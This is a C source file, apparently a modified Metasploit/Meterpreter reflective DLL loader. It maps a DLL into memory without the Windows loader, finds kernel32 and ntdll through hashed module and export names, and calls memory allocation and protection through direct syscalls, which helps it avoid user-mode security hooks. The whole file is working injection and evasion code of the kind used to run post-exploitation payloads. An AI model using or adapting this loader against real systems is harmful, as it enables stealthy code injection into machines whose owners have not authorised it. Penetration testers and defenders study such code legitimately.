//===============================================================================================//
// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without modification, are permitted
// provided that the following conditions are met:
//
//     * Redistributions of source code must retain the above copyright notice, this list of
// conditions and the following disclaimer.
//
//     * Redistributions in binary form must reproduce the above copyright notice, this list of
// conditions and the following disclaimer in the documentation and/or other materials provided
// with the distribution.
//
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
// #ifdef ARKARI_OBFUSCATOR
// #pragma optimize("", off)
// #pragma clang optimize off
// #endif
#include "ReflectiveLoader.h"
#include "DirectSyscall.c"

// Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
HINSTANCE hAppInstance = NULL;

#ifdef _MSC_VER
#pragma warning(push)
#pragma warning(disable : 4127) // conditional expression is constant
#endif

#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif
// This function can not be inlined by the compiler, ensuring we get the address of the
// instruction that called into the loader, which is critical for finding our own image base.
__declspec(noinline) ULONG_PTR caller(VOID)
{
	return (ULONG_PTR)WIN_GET_CALLER();
}
//===============================================================================================//
#ifdef RDIDLL_NOEXPORT
#define RDIDLLEXPORT
#else
#define RDIDLLEXPORT DLLEXPORT
#endif

//===============================================================================================//
//                                     INTERNAL DEBUGGING CODES                                  //
//===============================================================================================//
#define RDI_ERR_BASE 0xE0000000
#define RDI_SUCCESS (0x00000001)
#define RDI_ERR_FIND_IMAGE_BASE (RDI_ERR_BASE | 0x1000)
#define RDI_ERR_RESOLVE_DEPS (RDI_ERR_BASE | 0x2000) // Generic dependency failure
#define RDI_ERR_ALLOC_MEM (RDI_ERR_BASE | 0x3000)
// Granular codes for dependency resolution:
#define RDI_ERR_NO_KERNEL32 (RDI_ERR_BASE | 0x2100)		 // Failed to find kernel32.dll by hash
#define RDI_ERR_NO_NTDLL (RDI_ERR_BASE | 0x2200)		 // Failed to find ntdll.dll by hash
#define RDI_ERR_NO_EXPORTS (RDI_ERR_BASE | 0x2300)		 // Found kernel32, but couldn't find required exports
#define RDI_ERR_GETSYSCALLS_FAIL (RDI_ERR_BASE | 0x2400) // getSyscalls() failed

// Helper to return a unique error code, making remote debugging possible.
static ULONG_PTR _report_and_exit(DWORD dwErrorCode)
{
	return dwErrorCode;
}

//===============================================================================================//
//                                      INTERNAL LOADER CONTEXT                                  //
//===============================================================================================//
// An enum to provide symbolic, compile-time-checked names for syscall array indices.
typedef enum _SYSCALL_INDEX
{
	SyscallIndexAllocateVirtualMemory,
	SyscallIndexProtectVirtualMemory,
	SyscallIndexFlushInstructionCache,
#ifdef ENABLE_STOPPAGING
	SyscallIndexLockVirtualMemory,
#endif
	// This special value is used to keep track of the number of syscall indices and should
	// always be the last element of the enum. Its value will equal the total count of
	// syscalls required by the loader.
	SyscallIndexMax
} SYSCALL_INDEX;

// A context structure to hold all state for the loader, improving readability.
typedef struct
{
	ULONG_PTR uiLibraryAddress;
	ULONG_PTR uiBaseAddress;
	PIMAGE_NT_HEADERS pNtHeaders;
	LOADLIBRARYA pLoadLibraryA;
	GETPROCADDRESS pGetProcAddress;
	PVOID pNtdllBase;

	// Centralized array for all required syscalls.
	Syscall Syscalls[SyscallIndexMax];

} LOADER_CONTEXT, *PLOADER_CONTEXT;

//===============================================================================================//
//                                    INTERNAL HELPER FUNCTIONS                                  //
//===============================================================================================//

// STEP 0: Finds the loader's own image base in memory by searching backwards from the caller's address.
static COMPILER_OPTIONS ULONG_PTR _find_image_base(VOID)
{
	ULONG_PTR uiLibraryAddress = caller();
	while (TRUE)
	{
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uiLibraryAddress;
		if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
		{
			ULONG_PTR uiHeaderValue = pDosHeader->e_lfanew;
			// Sanity check the e_lfanew value to avoid problems with bogus PE signatures.
			if (uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024)
			{
				if (((PIMAGE_NT_HEADERS)(uiLibraryAddress + uiHeaderValue))->Signature == IMAGE_NT_SIGNATURE)
					return uiLibraryAddress;
			}
		}
		uiLibraryAddress--;
	}
}

// STEP 1: Resolves all required functions and prepares for direct syscalls.
static COMPILER_OPTIONS DWORD _resolve_dependencies(PLOADER_CONTEXT pContext)
{
	ULONG_PTR uiBaseAddress;
	USHORT usCounter;
	DWORD dwHashValue;
	BOOL bFoundKernel32 = FALSE;
	BOOL bFoundNtdll = FALSE;

	// X plicitly allocate a temporary array of pointers to the Syscall entries in our context.
	// P rovide this array to satisfy the getSyscalls function signature.
	// S uppress compiler-driven vectorization by explicitly unrolling the loop.
	// U tilize simple MOV instructions to eliminate 16-byte alignment requirements on 32-bit stacks.
	// C onsider constrained loader execution environments (e.g., within Meterpreter) where alignment isn’t guaranteed.
	// K eep manual assignments to prevent emission of SSE MOVAPS instructions.
	// S afeguard Windows XP builds against potential general protection faults.
	Syscall *pSyscalls[SyscallIndexMax];
	pSyscalls[SyscallIndexAllocateVirtualMemory] = &pContext->Syscalls[SyscallIndexAllocateVirtualMemory];
	pSyscalls[SyscallIndexProtectVirtualMemory] = &pContext->Syscalls[SyscallIndexProtectVirtualMemory];
	pSyscalls[SyscallIndexFlushInstructionCache] = &pContext->Syscalls[SyscallIndexFlushInstructionCache];
	#ifdef ENABLE_STOPPAGING
		pSyscalls[SyscallIndexLockVirtualMemory] = &pContext->Syscalls[SyscallIndexLockVirtualMemory];
	#endif

	// Get the Process Environment Block (PEB) pointer in an architecture-specific way.
#if defined(_M_X64)
	uiBaseAddress = __readgsqword(0x60);
#elif defined(_M_ARM64)
	uiBaseAddress = __readx18qword(0x60);
#elif defined(_M_IX86)
	uiBaseAddress = __readfsdword(0x30);
#elif defined(_M_ARM)
	uiBaseAddress = *(DWORD *)((BYTE *)_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0x30);
#endif

	// Navigate to the list of loaded modules.
	// Ref: https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data
	uiBaseAddress = (ULONG_PTR)((_PPEB)uiBaseAddress)->pLdr;

	ULONG_PTR pModuleListEntry = (ULONG_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;

	// Iterate through the loaded modules to find kernel32.dll and ntdll.dll by hash.
	while (pModuleListEntry)
	{
		PLDR_DATA_TABLE_ENTRY pLdrEntry = (PLDR_DATA_TABLE_ENTRY)pModuleListEntry;

		ULONG_PTR pModuleName = (ULONG_PTR)pLdrEntry->BaseDllName.pBuffer;
		DWORD dwModuleHash = 0;
		usCounter = pLdrEntry->BaseDllName.Length;

		// Compute the hash of the module name.
		do
		{
			dwModuleHash = ror(dwModuleHash);
			if (*((BYTE *)pModuleName) >= 'a')
				dwModuleHash += *((BYTE *)pModuleName) - 0x20;
			else
				dwModuleHash += *((BYTE *)pModuleName);
			pModuleName++;
		} while (--usCounter);

		if (dwModuleHash == KERNEL32DLL_HASH)
		{
			bFoundKernel32 = TRUE;
			uiBaseAddress = (ULONG_PTR)pLdrEntry->DllBase;

			// Parse the kernel32 export table to find LoadLibraryA and GetProcAddress.
			// We must correctly handle both 32-bit and 64-bit PE headers.
			PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
			ULONG_PTR uiExportDirRva = 0;

			if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
			{
				// 64-bit PE header
				uiExportDirRva = ((PIMAGE_NT_HEADERS64)pNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
			}
			else
			{
				// 32-bit PE header
				uiExportDirRva = ((PIMAGE_NT_HEADERS32)pNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
			}

			PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uiBaseAddress + uiExportDirRva);
 
			PDWORD pdwNameArray = (PDWORD)(uiBaseAddress + pExportDir->AddressOfNames);
			PWORD pwNameOrdinals = (PWORD)(uiBaseAddress + pExportDir->AddressOfNameOrdinals);
			PDWORD pdwAddressArray = (PDWORD)(uiBaseAddress + pExportDir->AddressOfFunctions);

			for (usCounter = 0; usCounter < pExportDir->NumberOfNames; usCounter++)
			{
				dwHashValue = _hash((char *)(uiBaseAddress + pdwNameArray[usCounter]));
				if (dwHashValue == LOADLIBRARYA_HASH)
					pContext->pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + pdwAddressArray[pwNameOrdinals[usCounter]]);
				else if (dwHashValue == GETPROCADDRESS_HASH)
					pContext->pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + pdwAddressArray[pwNameOrdinals[usCounter]]);
				if (pContext->pLoadLibraryA && pContext->pGetProcAddress)
					break;
			}
		}
		else if (dwModuleHash == NTDLLDLL_HASH)
		{
			bFoundNtdll = TRUE;
			pContext->pNtdllBase = pLdrEntry->DllBase;
		}

		if (bFoundKernel32 && bFoundNtdll)
			break;

		pModuleListEntry = DEREF(pModuleListEntry);
	}

	if (!bFoundKernel32)
		return RDI_ERR_NO_KERNEL32;
	if (!bFoundNtdll)
		return RDI_ERR_NO_NTDLL;
	if (!pContext->pLoadLibraryA || !pContext->pGetProcAddress)
		return RDI_ERR_NO_EXPORTS;

	if (!getSyscalls(pContext->pNtdllBase, pSyscalls, SyscallIndexMax))
		return RDI_ERR_GETSYSCALLS_FAIL;

	return RDI_SUCCESS;
}

static COMPILER_OPTIONS BOOL _load_image_into_memory(PLOADER_CONTEXT pContext)
{
	SIZE_T RegionSize = pContext->pNtHeaders->OptionalHeader.SizeOfImage;

	pContext->uiBaseAddress = 0;
	if (rdiNtAllocateVirtualMemory(&pContext->Syscalls[SyscallIndexAllocateVirtualMemory], (HANDLE)-1, (PVOID *)&pContext->uiBaseAddress, 0, &RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE) != 0)
		return FALSE;

#ifdef ENABLE_STOPPAGING
	// This call can fail on older systems (e.g. Server 2012) with
	// STATUS_WORKING_SET_QUOTA, but this failure is not critical.
	rdiNtLockVirtualMemory(&pContext->Syscalls[SyscallIndexLockVirtualMemory], (HANDLE)-1, (PVOID *)&pContext->uiBaseAddress, &RegionSize, 1);
#endif

	// Copy the PE headers from the original image to the newly allocated buffer.
	DWORD dwSizeOfHeaders = pContext->pNtHeaders->OptionalHeader.SizeOfHeaders;
	PBYTE pSourceBase = (PBYTE)pContext->uiLibraryAddress;
	PBYTE pDestinationBase = (PBYTE)pContext->uiBaseAddress;

	while (dwSizeOfHeaders--)
		*pDestinationBase++ = *pSourceBase++;

	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pContext->pNtHeaders);
	for (USHORT i = 0; i < pContext->pNtHeaders->FileHeader.NumberOfSections; i++, pSectionHeader++)
	{
		PBYTE pDestination = (PBYTE)(pContext->uiBaseAddress + pSectionHeader->VirtualAddress);
		PBYTE pSource = (PBYTE)(pContext->uiLibraryAddress + pSectionHeader->PointerToRawData);
		DWORD dwSectionSize = pSectionHeader->SizeOfRawData;

		while (dwSectionSize--)
			*pDestination++ = *pSource++;
	}

	return TRUE;
}

// STEP 4: Process the image's Import Address Table (IAT).
static COMPILER_OPTIONS void _process_imports(PLOADER_CONTEXT pContext)
{
	PIMAGE_DATA_DIRECTORY pDataDirectory = &pContext->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if (pDataDirectory->Size == 0)
		return;

	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pContext->uiBaseAddress + pDataDirectory->VirtualAddress);

	// Iterate through each imported DLL.
	for (; pImportDesc->Name; pImportDesc++)
	{
		ULONG_PTR uiLibraryAddress = (ULONG_PTR)pContext->pLoadLibraryA((LPCSTR)(pContext->uiBaseAddress + pImportDesc->Name));
		if (!uiLibraryAddress)
			continue;

		PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(pContext->uiBaseAddress + pImportDesc->OriginalFirstThunk);
		PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(pContext->uiBaseAddress + pImportDesc->FirstThunk);

		// Iterate through each function imported from the DLL.
		for (; pFirstThunk->u1.AddressOfData; pFirstThunk++, pOriginalFirstThunk++)
		{
			if (pOriginalFirstThunk && (pOriginalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG))
			{
				// Import by ordinal
				PIMAGE_NT_HEADERS pLibNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);
				PIMAGE_DATA_DIRECTORY pLibDataDirectory = &pLibNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
				PIMAGE_EXPORT_DIRECTORY pLibExportDir = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pLibDataDirectory->VirtualAddress);
				PDWORD pdwAddressArray = (PDWORD)(uiLibraryAddress + pLibExportDir->AddressOfFunctions);

				pFirstThunk->u1.Function = (uiLibraryAddress + pdwAddressArray[IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal) - pLibExportDir->Base]);
			}
			else
			{
				// Import by name
				PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pContext->uiBaseAddress + pFirstThunk->u1.AddressOfData);
				pFirstThunk->u1.Function = (ULONG_PTR)pContext->pGetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)pImportByName->Name);
			}
		}
	}
}

// STEP 5: Process the image's base relocations.
static COMPILER_OPTIONS void _process_relocations(PLOADER_CONTEXT pContext)
{
	ULONG_PTR uiDelta = pContext->uiBaseAddress - pContext->pNtHeaders->OptionalHeader.ImageBase;
	if (uiDelta == 0)
		return; // No relocation needed if loaded at preferred base.

	PIMAGE_DATA_DIRECTORY pDataDirectory = &pContext->pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (pDataDirectory->Size == 0)
		return;

	PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(pContext->uiBaseAddress + pDataDirectory->VirtualAddress);

	for (; pBaseReloc->SizeOfBlock; pBaseReloc = (PIMAGE_BASE_RELOCATION)((ULONG_PTR)pBaseReloc + pBaseReloc->SizeOfBlock))
	{
		ULONG_PTR pRelocationBlockBase = (pContext->uiBaseAddress + pBaseReloc->VirtualAddress);
		ULONG uiEntryCount = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
		PIMAGE_RELOC pReloc = (PIMAGE_RELOC)((ULONG_PTR)pBaseReloc + sizeof(IMAGE_BASE_RELOCATION));

		// Perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
		// We don't use a switch statement to avoid the compiler building a jump table
		// which would not be very position independent.
		// Iterate through each relocation block.
		for (ULONG i = 0; i < uiEntryCount; i++, pReloc++)
		{
			if (pReloc->type == IMAGE_REL_BASED_DIR64)
				*(ULONG_PTR *)((ULONG_PTR)pRelocationBlockBase + pReloc->offset) += uiDelta;
			else if (pReloc->type == IMAGE_REL_BASED_HIGHLOW)
				*(DWORD *)((ULONG_PTR)pRelocationBlockBase + pReloc->offset) += (DWORD)uiDelta;
#if defined(_M_ARM)
			// Note: On ARM, the compiler optimization /O2 seems to introduce an off by one issue, possibly a code gen bug.
			// Using /O1 instead avoids this problem.
			else if (pReloc->type == IMAGE_REL_BASED_ARM_MOV32T)
			{
				// Handle 32-bit ARM-specific relocations for MOVW/MOVT instruction pairs.
				// This involves extracting and re-encoding a 16-bit immediate value.
				// Get the MOV.T instruction's DWORD value (We add 4 to the offset to go past the first MOV.W which handles the low word).
				DWORD dwInstruction = *(DWORD *)((ULONG_PTR)pRelocationBlockBase + pReloc->offset + sizeof(DWORD));
				// Flip the words to get the instruction as expected (account for endianness/instruction packing).
				dwInstruction = MAKELONG(HIWORD(dwInstruction), LOWORD(dwInstruction));
				// Sanity check we are processing a MOVT instruction.
				if ((dwInstruction & ARM_MOV_MASK) == ARM_MOVT)
				{
					// Pull out the encoded 16-bit immediate value (high portion of the address-to-relocate).
					WORD wImm = (WORD)(dwInstruction & 0x000000FF);
					wImm |= (WORD)((dwInstruction & 0x00007000) >> 4);
					wImm |= (WORD)((dwInstruction & 0x04000000) >> 15);
					wImm |= (WORD)((dwInstruction & 0x000F0000) >> 4);
					// Apply the relocation delta to the target address.
					DWORD dwAddress = ((WORD)HIWORD(uiDelta) + wImm) & 0xFFFF;
					// Create a new instruction with the same opcode and register parameters.
					dwInstruction &= ARM_MOV_MASK2;
					// Patch in the relocated address, re-encoding the immediate value.
					dwInstruction |= (DWORD)(dwAddress & 0x00FF);
					dwInstruction |= (DWORD)(dwAddress & 0x0700) << 4;
					dwInstruction |= (DWORD)(dwAddress & 0x0800) << 15;
					dwInstruction |= (DWORD)(dwAddress & 0xF000) << 4;
					// Flip the instructions words and patch back into the code.
					*(DWORD *)((ULONG_PTR)pRelocationBlockBase + pReloc->offset + sizeof(DWORD)) = MAKELONG(HIWORD(dwInstruction), LOWORD(dwInstruction));
				}
			}
#endif
			else if (pReloc->type == IMAGE_REL_BASED_HIGH)
				*(WORD *)((ULONG_PTR)pRelocationBlockBase + pReloc->offset) += HIWORD(uiDelta);
			else if (pReloc->type == IMAGE_REL_BASED_LOW)
				*(WORD *)((ULONG_PTR)pRelocationBlockBase + pReloc->offset) += LOWORD(uiDelta);
		}
	}
}

// STEP 6: Set the correct memory protections on each section of the newly loaded image.
static COMPILER_OPTIONS void _set_memory_protections(PLOADER_CONTEXT pContext)
{
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pContext->pNtHeaders);
	for (USHORT i = 0; i < pContext->pNtHeaders->FileHeader.NumberOfSections; i++, pSectionHeader++)
	{
		PVOID pSectionBase = (PVOID)(pContext->uiBaseAddress + pSectionHeader->VirtualAddress);
		SIZE_T dwSectionSize = pSectionHeader->Misc.VirtualSize;
		DWORD dwProtect = 0, dwOldProtect;
		// Characteristics processing courtesy of Dark Vort∑x, 2021-06-01
		// See: https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/
		DWORD characteristics = pSectionHeader->Characteristics;

		if (dwSectionSize == 0)
			continue;

		// Map PE section characteristics to Windows memory protection constants.
		if (characteristics & IMAGE_SCN_MEM_EXECUTE)
		{
			if (characteristics & IMAGE_SCN_MEM_READ)
				dwProtect = (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
			else
				dwProtect = (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_WRITECOPY : PAGE_EXECUTE;
		}
		else
		{
			if (characteristics & IMAGE_SCN_MEM_READ)
				dwProtect = (characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY;
			else if (characteristics & IMAGE_SCN_MEM_WRITE)
				dwProtect = PAGE_WRITECOPY;
			else
				dwProtect = PAGE_NOACCESS;
		}

		rdiNtProtectVirtualMemory(&pContext->Syscalls[SyscallIndexProtectVirtualMemory], (HANDLE)-1, &pSectionBase, &dwSectionSize, dwProtect, &dwOldProtect);
	}
}

// STEP 7 & 8: Call the image's entry point and return its address.
static COMPILER_OPTIONS ULONG_PTR _call_entry_point(PLOADER_CONTEXT pContext, LPVOID lpParameter)
{
	// Get the address of the entry point.
	ULONG_PTR pEntryPoint = (pContext->uiBaseAddress + pContext->pNtHeaders->OptionalHeader.AddressOfEntryPoint);

	// Flush the instruction cache to avoid executing stale code after relocations.
	rdiNtFlushInstructionCache(&pContext->Syscalls[SyscallIndexFlushInstructionCache], (HANDLE)-1, NULL, 0);

// If we are injecting a DLL via LoadRemoteLibraryR, we call DllMain and pass in our parameter (via the DllMain lpReserved parameter).
// Otherwise, if we are injecting a DLL via a stub, we call DllMain with no parameter.
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
	((DLLMAIN)pEntryPoint)((HINSTANCE)pContext->uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter);
#else
	((DLLMAIN)pEntryPoint)((HINSTANCE)pContext->uiBaseAddress, DLL_PROCESS_ATTACH, NULL);
#endif
	return pEntryPoint;
}

//===============================================================================================//
//                                         PUBLIC LOADER                                         //
//===============================================================================================//
// This is our position independent reflective DLL loader/injector
// On 32-bit systems, the default __stdcall convention causes name mangling (_FunctionName@Bytes).
// By explicitly declaring the loader as __cdecl, we ensure the name is exported simply
// as "ReflectiveLoader" on all platforms, which is what the injector expects.
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
RDIDLLEXPORT COMPILER_OPTIONS ULONG_PTR __cdecl ReflectiveLoader(LPVOID lpParameter)
#else
RDIDLLEXPORT COMPILER_OPTIONS ULONG_PTR WINAPI ReflectiveLoader(VOID)
#endif
{
	// NOTE:    Using SecureZeroMemory instead of `LOADER_CONTEXT context = { 0 }` because of segmentfault in metsrv.
	// DETAILS: Under the hood, MSVC zeros the structure with a memset call, for some reason this is crashing sometimes.
	//          The bug is build-specific, meaning compiling the same source may result in having or not having this bug.
	//          Also, this seems to be happening only on metsrv, where probably we are calling the ReflectiveLoader in hacky
	//          context. using SecureZeroMemory avoid calling memset and performs the zero setting inplace.

	LOADER_CONTEXT context;
	SecureZeroMemory(&context, sizeof(LOADER_CONTEXT));

	context.Syscalls[SyscallIndexAllocateVirtualMemory].dwCryptedHash = ZWALLOCATEVIRTUALMEMORY_HASH;
	context.Syscalls[SyscallIndexAllocateVirtualMemory].dwNumberOfArgs = 6;

	context.Syscalls[SyscallIndexProtectVirtualMemory].dwCryptedHash = ZWPROTECTVIRTUALMEMORY_HASH;
	context.Syscalls[SyscallIndexProtectVirtualMemory].dwNumberOfArgs = 5;

	context.Syscalls[SyscallIndexFlushInstructionCache].dwCryptedHash = ZWFLUSHINSTRUCTIONCACHE_HASH;
	context.Syscalls[SyscallIndexFlushInstructionCache].dwNumberOfArgs = 3;

#ifdef ENABLE_STOPPAGING
	context.Syscalls[SyscallIndexLockVirtualMemory].dwCryptedHash = ZWLOCKVIRTUALMEMORY_HASH;
	context.Syscalls[SyscallIndexLockVirtualMemory].dwNumberOfArgs = 4;
#endif

	// STEP 0: Find our own image base in memory.
	context.uiLibraryAddress = _find_image_base();
	if (!context.uiLibraryAddress)
		return _report_and_exit(RDI_ERR_FIND_IMAGE_BASE);

	context.pNtHeaders = (PIMAGE_NT_HEADERS)(context.uiLibraryAddress + ((PIMAGE_DOS_HEADER)context.uiLibraryAddress)->e_lfanew);

	// STEP 1: Resolve kernel32.dll/ntdll.dll functions and prepare for direct syscalls.
	DWORD dwResolveResult = _resolve_dependencies(&context);
	if (dwResolveResult != RDI_SUCCESS)
		return _report_and_exit(dwResolveResult);

	// STEP 2 & 3: Allocate a new permanent memory location and copy the image.
	if (!_load_image_into_memory(&context))
		return _report_and_exit(RDI_ERR_ALLOC_MEM);

	// STEP 4: Process the image's import table.
	_process_imports(&context);

	// STEP 5: Process the image's base relocations.
	_process_relocations(&context);

	// STEP 6: Set final memory protections on the image sections.
	_set_memory_protections(&context);

	// STEP 7 & 8: Call the DLL's entry point and return the new base address.
	return _call_entry_point(&context,
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
							 lpParameter
#else
							 NULL
#endif
	);
}
//===============================================================================================//

#ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
// Default DllMain if the user does not supply their own.
COMPILER_OPTIONS BOOL  WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
#endif

#ifdef _MSC_VER
#pragma warning(pop)
#endif